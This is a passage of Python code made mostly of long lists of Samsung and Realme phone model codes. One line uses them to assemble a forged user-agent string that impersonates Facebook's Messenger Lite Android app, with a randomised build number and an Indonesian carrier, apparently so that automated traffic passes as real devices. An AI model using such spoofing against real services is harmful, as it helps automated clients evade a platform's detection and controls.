'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9168I', 'GT-I9168I', 'SAMSUNG-GT-I9168_TD Release/1.15.2014 Browser/AppleWebKit/534.30', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'SM-G531F', 'SM-G531H', 'SM-G530T', 'SM-G530H', 'SM-G530BT', 'SM-G530FZ', 'SM-G532F', 'SM-G531M', 'SM-G531BT', 'SAMSUNG-SM-J727AZ', 'SM-J100FN', 'SM-J100H', 'SM-J120H', 'SM-J120F', 'SM-J120FN', 'SM-J120H', 'SM-J111F', 'SM-J111M', 'SM-J110H', 'SM-J111M', 'SM-J110G', 'SM-J110F', 'SM-J105B', 'SM-J105H', 'SM-J105Y', 'SM-J106F', 'SM-J106H', 'SM-J106B', 'SM-J106M', 'SM-J200GU', 'SM-J200F', 'SM-J200M', 'SM-J200H', 'SM-J260F', 'SM-J260M', 'SM-J260G', 'SM-J260FU', 'SM-J260MU', 'SM-J260Y', 'SM-J200BT', 'SAMSUNG SM-J200BT', 'SM-G532G', 'SM-G532M', 'SM-G532MT', 'SM-J250G', 'SM-J250M', 'SM-J250F', 'SM-J250Y', 'SAMSUNG SM-J260AZ', 'SM-J3109', 'SM-J320Y', 'SM-J320H', 'SM-J320G', 'SM-J320FN', 'SM-J320V', 'SM-J320M', 'SAMSUNG-SM-J320A', 'SM-J330FN', 'SAMSUNG SM-J330F', 'SAMSUNG SM-J330FN/J330FNXXS4CUD3', 'SM-J330G', 'SM-J337P', 'SM-J337V', 'SAMSUNG SM-J337W', 'SM-J337U', 'SM-J337VPP', 'SM-J337R4', 'SM-J327V', 'SM-J327P', 'SM-J327R4', 'SM-S327VL', 'SM-S337TL', 'SAMSUNG SM-S327VL', 'SM-J327VPP', 'SM-S367VL', 'SAMSUNG SM-S367VL', 'SM-S357BL', 'SM-J327T1', 'SM-J3110', 'SM-J3119S', 'SAMSUNG-SM-J3119', 'SM-S320VL', 'SM-J337T', 'SM-J400F', 'SM-J400M', 'SM-J400G', 'SM-J400M', 'SM-J410F', 'SM-J410G', 'SM-J410F', 'SM-J410F', 'SM-J410F', 'SM-J415FN', 'SM-J415GN', 'Galaxy j5', 'SM-J500M', 'SM-J500G', 'SM-J500F', 'SM-J500H', 'SM-J500FN', 'SM-J510H', 'SM-J510FQ', 'SM-J510FN', 'SM-J510MN', 'SM-J510MN', 'SM-J510GN', 'SM-J530F', 'SAMSUNG SM-J530F/J530FXXS9CUE5', 'SM-G570M', 'SM-G570F', 'SM-G570Y', 'SM-J530Y', 'SAMSUNG SM-J530G', 'SM-J600FN', 'SM-J600GT', 'SM-J610FN', 'SM-J610F', 'SM-J610G', 'SM-J710F', 'SM-J700M', 'SM-J700H', 'SM-J710MN', 'SM-J710K', 'SM-J7108', 'SM-J700F', 'SM-J700P', 'SM-J710GN', 'SM-J700T', 'SM-J700T1', 'SAMSUNG SM-J727A', 'SM-J730K', 'SM-J727R4', 'SM-J727S', 'SM-J727U', 'SM-J737T1', 'SM-J737A', 'SM-J737V', 'SAMSUNG SM-J737U', 'SM-J737R4', 'SM-J737S', 'SM-J737P', 'SM-J701F', 'SM-J701MT', 'SM-S767VL', 'SM-S757BL', 'SAMSUNG SM-S767VL', 'SM-J720F', 'SM-J720M', 'SM-G615F', 'SAMSUNG SM-G615F', 'SM-G615FU', 'SM-G615F', 'SM-G610F', 'SM-G610M', 'SM-G610Y', 'SM-G611MT', 'SM-G611FF', 'SM-G611FF', 'SM-J730G', 'SM-J730F', 'SM-J730FM', 'SM-S727VL', 'SM-S737TL', 'SAMSUNG SM-S727VL', 'SAMSUNG SM-J727T1', 'U', 'SM-J727V', 'SM-J727P', 'SM-J727VPP', 'SM-C710F', 'SAMSUNG SM-C710F', 'SM-J810F', 'SM-J810Y', 'SM-J810M', 'SM-J810G', 'SM-J810M', 'SM-J8 Plus', 'SM-J8 Pro', 'SM-J8 Pro', 'SM-J8 Pro[9]', 'SM-J8 Pro [9]', 'SM-A605K', 'SAMSUNG SM-A605K/KKS3CVH2', 'SAMSUNG SM-A605K/KKU1ARG2', 'SAMSUNG SM-A605K/KKU3CTF2', 'SM-A202K', 'SAMSUNG SM-A202K/KKS8CWA1', 'SAMSUNG SM-M336K/KSU4CWD2', 'SAMSUNG SM-M336K/KSU4CWB3', 'SAMSUNG SM-M336K/KSU3BWA2', 'SM-A326K', 'SAMSUNG SM-A326K/KSS4DWC5', 'SAMSUNG SM-A326K/KSU3CVK5', 'SAMSUNG SM-A326K/KSU4DWB7', 'SAMSUNG SM-A326K/KSS3BVI2', 'SM-C115', 'SM-C115L', 'SM-C1158', 'SAMSUNG-SM-C1158_TD Android/4.4.2 Release/04.15.2014 Browser/AppleWebKit537.36', 'SM-C115W', 'SM-C115M', 'SM-S120VL', 'SAMSUNG SM-S120VL', 'SM-M015G', 'SM-M015F', 'SAMSUNG SM-M015G', 'SAMSUNG SM-M015F', 'SM-M013F', 'SAMSUNG SM-M013F', 'SM-M017F', 'SAMSUNG SM-M017F', 'SM-M022F', 'SM-M022G', 'SM-M025F', 'SM-M025F/DS', 'SM-E045F', 'SM-M045F', 'SM-M105M', 'SM-M105F', 'SM-M105G', 'SM-M107F', 'SAMSUNG SM-M107F', 'SM-M115F', 'SM-M127F', 'SM-M127G', 'SM-M135F', 'SAMSUNG SM-M135F', 'SM-M135FU', 'SM-M135M', 'SM-M136B', 'SAMSUNG SM-M136B', 'SM-M146B', 'SAMSUNG SM-M146B', 'SM-M205F', 'SM-M205M', 'SM-M205FN', 'SM-M205F', 'SM-M215F', 'SM-M215G', 'SAMSUNG SM-M215G', 'SM-M225FV', 'SAMSUNG SM-M225FV', 'SM-M236B', 'SAMSUNG SM-M236B', 'SM-M305F', 'SM-M305M', 'SM-M305M/DS', 'SM-M305F', 'SM-M307F', 'SM-M307FN', 'SM-M3070', 'SM-M307F', 'SM-M315F', 'SM-M315F/DS', 'SM-M317F', 'SAMSUNG SM-M317F', 'SM-M317F/DSN', 'SM-M325FV', 'SAMSUNG SM-M325FV', 'SM-M326B', 'SAMSUNG SM-M326B', 'SM-M336BU', 'SAMSUNG SM-M336B', 'SM-M405F', 'SAMSUNG SM-M405F', 'SM-M426B', 'SM-M515F', 'SM-M515F/DSN', 'SM-M526BR', 'SM-M536B', 'SAMSUNG SM-M536B', 'SM-M536B', 'SM-M625F', 'SM-M625F/DS', 'SAMSUNG SM-M625F', 'SGH-I527M', 'SM-G750H', 'SM-G7508Q', 'SM-G7509', 'SAMSUNG-SM-G750A', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'SM-N970U', 'SM-N9700', 'SM-N970F', 'SM-N970U', 'SM-N971N', 'SM-N770F', 'SAMSUNG SM-N770F', 'SM-N975U', 'SM-N975F', 'SM-N975U1', 'SAMSUNG SM-N976B/N976BXXS8HWC5', 'SM-N976U', 'SM-N976N', 'SGH-I317M', 'Samsung Galaxy Note 2', 'SM-N980F', 'SAMSUNG SM-N980F', 'SAMSUNG SM-N981B', 'SM-N9810', 'SM-N981U', 'SM-N981N', 'SM-N985F', 'SAMSUNG SM-N985F', 'SM-N986U1', 'SM-N986B', 'SAMSUNG SM-N986B', 'SAMSUNG SM-N986U', 'SM-N986N', 'SM-N9008V', 'SM-N9006', 'SAMSUNG-SM-N900A', 'SM-N9005', 'SM-N900W8', 'Samsung GALAXY Note 3', 'SM-N900L', 'SM-N9009', 'SM-N900T', 'SM-N900P', 'SM-N9000Q', 'SAMSUNG SM-N9002', 'SM-N9002', 'SAMSUNG SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-9005', 'SM-9005', 'SM-N750L', 'SM-N7505', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SM-N9100', 'SM-N910C', '1440x2560', 'SM-N910V', 'SM-N910H', 'SM-N910U', 'SM-N9108V', 'SM-N915FY', 'SM-N915T', 'SM-N9150', 'SM-N915G', 'SM-N915A', 'SM-N915S', 'SM-N915D', 'SM-N915W8', 'SM-N916L', 'SM-N916S', 'SM-N916K', 'SM-N916LSK', 'SM-N920C', 'SM-N920L', 'SAMSUNG SM-N920C', 'SAMSUNG-SM-N920A', 'SM-N920K', 'SM-N920S', 'SM-N920G', 'SM-N920V', 'SM-N920I', 'SM-N9208', 'SM-N930F', 'SM-N9300', 'SM-N930x', 'SM-N930P', 'SM-N930X', 'SM-N930W8', 'SM-N930V', 'SM-N930T', 'SM-N9500', 'SM-N950U', 'SM-N950F', 'SM-N950N', 'SAMSUNG SM-N950F', 'SM-N960U', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960W', 'SC-01G', 'SCL24', 'SAMSUNG SCL24', 'SM-N935S', 'SM-N935F', 'SM-N935K', 'SM-N935L', 'N7100', 'GT-N7100', 'SAMSUNG GT-N7100', 'GT-N7100', 'GT-N7105', 'GT-N7105T', 'SAMSUNG GT-N7105/N7105XXDMC3', 'GT-N7105T', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'Galaxy Note N8000', 'Galaxy Note20', 'SAMSUNG EK-GN120', 'SM-G550T', 'SM-G5500', 'SM-G550FY', 'SM-G5510', 'SM-G550T1', 'SM-S550TL', 'SM-G5528', 'SM-G5528', 'SM-G600FY', 'SM-G600F', 'SM-G6000', 'SM-G6100', 'SM-G610S', 'SM-G611F', 'SM-G611L', 'SM-G611S', 'SAMSUNG SM-J710FN', 'P1 Galaxy Plus', 'SM-G110M', 'SM-G110H', 'SM-G110B', 'SM-G110H', 'SM-G110H', 'GT-S5310', 'GT-S5310I', 'GT-S5310C', 'GT-S5310B', 'GT-S5310T', 'GT-S5310G', 'GT-S5310E', 'GT-S5310E', 'GT-S5310L', 'GT-S5310G', 'GT-S5310', 'GT-S5310G', 'GT-S5301B', 'GT-S5301B', 'Gt-s5301b', 'GT-S5301B', 'GT-S5301', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'SAMSUNG GT-S5301/S5301XXAMA3', 'GT-S5301B', 'GT-S5301L', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510L', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510', 'SM-A826S', 'SAMSUNG SM-A826S', 'SAMSUNG SM-M536S', 'SM-G910S', 'SM-G910S', 'SM-G910S', 'SAMSUNG SM-G910S', 'GT-I9000', 'GT-I9000', 'GT-I9088', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9008', 'GT-i9008', 'GT-I9000', 'GT-I9000', 'GT-I9000B', 'GT-I9000M', 'GT-I9000', 'GT-I9070', 'GT-I9070', 'GT-I9070', 'GT-I9070P', 'GT-I9070P', 'SAMSUNG GT-I9070/I9070BULK1', 'GT-I9070', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562L', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'SPH-D710', 'SHV-E120S', 'SHV-E120L', 'SHV-E120K/KKJMD2', 'SHV-E120L', 'SHV-E120LSK', 'SHV-E120LSK', 'SHV-E120LKS', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S/KKJMD2', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'ISW11SC', 'SCH-I535', 'GT-I9300', 'GT-I9300', 'GT-I9305', 'SCH-R530X', 'SCH-R530X', 'SCH-R530U', 'GT-I9305T', 'SCH-R530C', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190N', 'GT-I8190', 'GT-I8190T', 'GT-I8190N', 'GT-I8200N', 'GT-I8200', 'GT-I8200', 'GT-I8200N', 'GT-I8200', 'GT-I8200L', 'GT-I8200', 'GT-I8200Q', 'GT-I8200Q', 'GT-I9301I', '720x1280', 'Samsung Galaxy S IV(I950X)', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SAMSUNG GT-I9001/I9001BOKQ4', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SM-G973F', 'SAMSUNG SM-G973F', 'SAMSUNG SM-G973U', 'SM-G977N', 'SM-G973U1', 'SAMSUNG SM-G973F/G973FXXSGHWC2', 'SAMSUNG SM-G977N', 'SAMSUNG SM-G770F', 'SM-G770F/DS', 'SM-G975F', 'SAMSUNG SM-G975F', 'SM-G975U', 'SM-G975U1', 'SAMSUNG SM-G975U', 'SAMSUNG SM-G975F/G975FXXSGHWC2', 'SC-05L', 'SM-G970F', 'SAMSUNG SM-G970F/G970FXXSGHWA3', 'SM-G970U', 'SM-G970U1', 'SAMSUNG SM-G980F', 'SM-G980F/DS', 'SM-G981U', 'SM-G981U', 'SM-G981B', 'SCG01', 'SM-G981U1', 'SM-G981W', 'SM-G981V', 'SM-G981N', 'SC-51A', 'SM-G9810', 'SC51Aa', 'SM-G780G', 'SAMSUNG SM-G780F', 'SAMSUNG SM-G780G', 'SM-G781B', 'SM-G781V', 'SM-G781U', 'SM-G781U1', 'Galaxy S20 Ultra', 'SM-G988B', 'SM-G988W', 'SM-G988U', 'SAMSUNG SM-G988B', 'SM-G988U1', 'SM-G988N', 'SAMSUNG SM-G985F/G985FXXSFFVIB', 'SM-G985F/DS', 'SM-G986B', 'SM-G986U', 'SAMSUNG SM-G986B', 'SM-G986N', 'SM-G986W', 'SM-G986U1', 'Galaxy S21', 'SM-G991W', 'SM-G991U1', 'SM-G991B', 'SM-G991B', 'SM-G991B', 'SC-51B', 'SM-G991V', 'SM-G990U2', 'SM-G990B2', 'SAMSUNG SM-G990B', 'SM-G990E', 'SAMSUNG SM-G990B/G990BXXU4EWC7', 'SM-G998U', 'SAMSUNG SM-G998B', 'SM-G998N', 'SM-G998U1', 'SAMSUNG SM-G998U', 'SM-G998W', 'Galaxy S21+', 'SM-G996U', 'SM-G996B', 'SM-G996N', 'SM-G996B', 'SM-G9960', 'SM-S901U', 'SAMSUNG SM-S901U', 'SM-S901U1', 'SM-S901B', 'SAMSUNG SM-S901B', 'SM-S901W', 'SAMSUNG SM-S908E', 'SM-S908B', 'SAMSUNG SM-S908U', 'SM-S908U1', 'SM-S9080', 'SM-S908U1', 'SAMSUNG SM-S908B', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906N', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906B', 'SM-S906U1', 'SM-S906W', 'SM-S911W', 'SM-S911B', 'SM-S911U', 'SM-S911U1', 'SM-S918W', 'SAMSUNG SM-S918B/S918BXXS1AWD1', 'SM-S918U', 'SM-S918U1', 'SM-S916U', 'SM-S916B', 'SM-S916U1', 'SM-S916W', 'Galaxy S3', 'Samsung Galaxy S3', 'Galaxy S3', 'SM-G730V', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SM-G730W8', 'GT-I9505', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SCH-I959', 'SAMSUNG GT-I9505-ORANGE', 'SCH-I545', 'GT-I9500', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SAMSUNG GT-I9505', 'SAMSUNG GT-I9505/I9505XXUAMDC', 'SAMSUNG GT-I9505/I9505XXUDMGG', 'GT-I9295', 'SHV-E330S', 'SHV-E330L', 'SAMSUNG SHV-E330L', 'SHV-E330S', 'SHV-E330K', 'SAMSUNG SHV-E330S', 'SHV-E330K', 'GT-I9195', 'lineage_serranoltexx', 'GT-I9195I', 'GT-I9192I', 'GT-I9190', 'GT-I9192', 'SCH-I435', 'GT-I9515', 'GT-I9506', 'SAMSUNG GT-I9506', 'SAMSUNG SM-C105L', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C105', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105S', 'SM-C105L', 'SM-G900T', 'SM-G900F', 'SM-G900V', 'SM-G900M', 'SM-G900F', 'SM-G900P', 'SM-G900H', 'SM-G9006V', 'SM-G900F', 'SM-G870W', 'SAMSUNG-SM-G890A', 'SAMSUNG-SM-G870A', '1080x1920', 'SAMSUNG SM-G890A', 'SM-G900FD', 'SM-G860P', 'SM-G901F', 'SAMSUNG SM-G901F/G901FXXU1CPHA', 'SM-G800F', 'SM-G800H', 'SM-G903F', 'SM-G903W', 'SM-G920I', 'SM-G920P', 'SM-G920F', 'SM-G920W8', 'SAMSUNG SM-G920F', 'SM-G920K', 'SAMSUNG-SM-G920A', 'SM-G925F', 'SM-G925K', 'SAMSUNG-SM-G925A', 'SM-G9250', 'SAMSUNG SM-G925F', 'SAMSUNG SM-G928F', 'SAMSUNG-SM-G928A', 'SM-G928C', 'SM-G9280', 'SM-G9287', 'SAMSUNG SM-G928T', 'SM-G928I', 'SM-G930F', 'SM-G930W8', 'SAMSUNG SM-G930F', 'SM-G930V', 'SM-G930U', 'SM-G930S', 'SM-G930L', 'SM-G9300', 'SAMSUNG-SM-G891A', 'SAMSUNG SM-G891A', 'SM-G935F', 'SM-G935U', 'SAMSUNG SM-G935A', 'SM-G935T', 'SM-G935VC', 'SM-G935S', 'SM-G935L', 'SAMSUNG SM-G935W8', 'SM-G9350', 'SAMSUNG SM-G950U', 'SAMSUNG SM-G950F', 'SM-G950U1', 'SM-G950N', 'SC-02J', 'SAMSUNG SM-G950W', 'SM-G892A', 'SAMSUNG SM-G892A', 'SAMSUNG SM-G892U', 'SM-G8750', 'SM-G8750', 'SM-G8750', 'SAMSUNG SM-G8750', 'SM-G955U', 'SM-G955F', 'SAMSUNG SM-G955F/G955FXXUCDVG4', 'SM-G955W', 'SM-G9550', 'SM-G960F', 'SM-G960U', 'SAMSUNG SM-G960U1', 'SAMSUNG SM-G960F', 'SM-G965U', 'SM-G965F', 'SM-G965F', 'SM-G965U1', 'SM-G9650', 'SAMSUNG-SM-J321AZ', 'SAMSUNG-SM-J321AZ', 'SAMSUNG SM-J321AZ', 'SAMSUNG-SM-J326AZ', 'SM-J336AZ', 'SAMSUNG SM-J336AZ', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700R', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'GT-P1000', 'GALAXY TAB', 'Galaxy Tab', 'GT-P1000', 'Galaxy Tab 2', 'Galaxy Tab 2 3G', 'GT-P3100', 'Flow', 'GT-P3113', 'GT-P3113', 'GT-P3110', 'GT-P3110', 'SM-T116', 'SM-T116NU', 'SM-T116NY', 'SM-T116NQ', 'Galaxy Tab 4', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'Galaxy Tab KT107', 'Galaxy Tab Pro', 'Galaxy Tab PRO 10', 'SAMSUNG-SM-T2519', 'Samsung galaxy tab s3', 'Galaxy Tab2 3G', 'Galaxy Tab3 P5200', 'Galaxy Tab3 T311', 'Galaxy Tab4', 'GT-S7560', 'SAMSUNG GT-S7560/S7560XXBNC2', 'GT-S7560M', 'SAMSUNG GT-S7560/S7560XXBNJ1', 'SAMSUNG GT-S7560/S7560XXAME9', 'SAMSUNG GT-S7560/S7560XXAMH3', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'SCH-I699I', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560', 'GT-S7560', 'GT-S7560', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', '800x1212', 'GT-S7390', 'GT-S7390', 'GT-S7390G', 'GT-S7390', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SAMSUNG GT-S7580/S7580XXUBOA1', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SM-G318MZ', 'SM-G318HZ', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'GT-I8150', 'SAMSUNG-SM-W2016', 'SM-W2016', 'SM-W2018', 'SM-W2018', 'SAMSUNG SM-W2019', 'SM-W2019', 'SAMSUNG SM-W2021', 'SM-W2021', 'SM-W2021', 'SAMSUNG SM-W2022', 'SAMSUNG SM-W9023', 'SM-G600S', 'SAMSUNG SM-G600S', 'SAMSUNG SM-E426S', 'GT-I8552', 'GT-I8552', 'GT-I8552B', 'GT-I8552', 'GT-I8552', 'SM-G3812', 'SM-G3812', 'SM-G3812B', 'SM-G3812B', 'SM-G3812', 'SM-G3812', 'Samsung SM-G3818', 'SM-G3818', 'SM-G3812', 'Galaxy Wonder', 'SX Galaxy Xcove 4S', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710-ORANGE/S7710XXANE3', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'SM-G388F', 'SAMSUNG SM-G388F', 'SM-G389F', 'SM-G390F', 'SM-G390W', 'SM-G398FN', 'SAMSUNG SM-G398FN', 'SM-G525F', 'SM-G525N', 'SAMSUNG SM-G525F', 'SM-G736U1', 'SM-G736B', 'SM-G736W', 'SAMSUNG SM-G736B', 'SM-G889A', 'SM-G715FN', 'SAMSUNG SM-G715FN', 'SM-G715U1', 'SM-G715W', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'gt-s5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360L', 'GT-S5360L', 'GT-S5360L', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'SAMSUNG GT-B5510/B5510XXLE1', 'SAMSUNG GT-B5510/B5510XXLL1', 'GT-B5510', 'GT-B5510L', 'GT-B5510B', 'GT-B5510L', 'GT-B5510', 'GT-B5510', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510-ORANGE/B5510BVLF1', 'GT-B5510-ORANGE/B5510BVLD1', 'GT-B5510-ORANGE/B5510BVLB1', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-B5512B', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-S6310N', 'GT-S6310B', 'GT-S6310N', 'GT-S6310N', 'GT-S6310N-ORANGE/S6310NXXAMK1', 'GT-S6310T', 'GT-S6310T', 'GT-S6310L', 'GT-S6310L', 'GT-S6310L', 'GT-S6310T', 'GT-S6310N', 'GT-S6310L', 'SM-G130H', 'SM-G130HN', 'SM-G130E', 'SM-G130BT', 'SM-G130BU', 'SM-G130BU', 'SM-G130BU', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'SM-F700N', 'U', 'SM-F700U1', 'SM-F7000', 'SM-F700W', 'SM-F711U1', 'SAMSUNG SM-F711B/F711BXXU2CVC7', 'SM-F711N', 'SAMSUNG SM-F711U', 'SM-F721B', 'SM-F721U', 'SAMSUNG SM-F721B', 'SM-F721U1', 'SM-F707B', 'SAMSUNG SM-F707B', 'SM-F707U', 'SM-F7070', 'SM-F707U1', 'SM-F707UZAAXAA', 'SM-F707W', 'SM-F916B', 'SM-F916U', 'SAMSUNG SM-F916B', 'SAMSUNG SM-F916U1', 'SM-F926U', 'SM-F926B', 'SM-F9260', 'SM-F926N', 'SM-F926W', 'SAMSUNG SM-F926B', 'SM-F936U', 'SAMSUNG SM-F936B', 'SM-F936U', 'SM-F936U1', 'SAMSUNG SM-F936W', 'galaxy Z Fold2', 'SAMSUNG SM-Z130H', 'SM-Z200F', 'SM-Z300H', 'SM-Z300H', 'SAMSUNG SM-Z300H', 'Gear Live', 'SM-R750', 'GT-I9060I', 'GT-I9060I', 'Samsung J600GN,telcel,mx', 'SAMSUNG M2004J19C', 'SAMSUNG M2006C3LG', 'SAMSUNG M2102J20SG', 'Samsung M6', 'Samsung N70', 'SAMSUNG N9106', 'SAMSUNG-N9106', 'SAMSUNG-N9106HD', 'GT-I8000', 'SAMSUNG-P9700', 'SAMSUNG S2_PRO', 'SM-G530T1', 'SAMSUNG-T805C', 'SAMSUNG-T805S', 'SAMSUNG-T950S', 'GT-S8500'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Samsung;FBBD/Samsung;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Realme" in str(self.device):
                self.android_model = random.choice(['RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 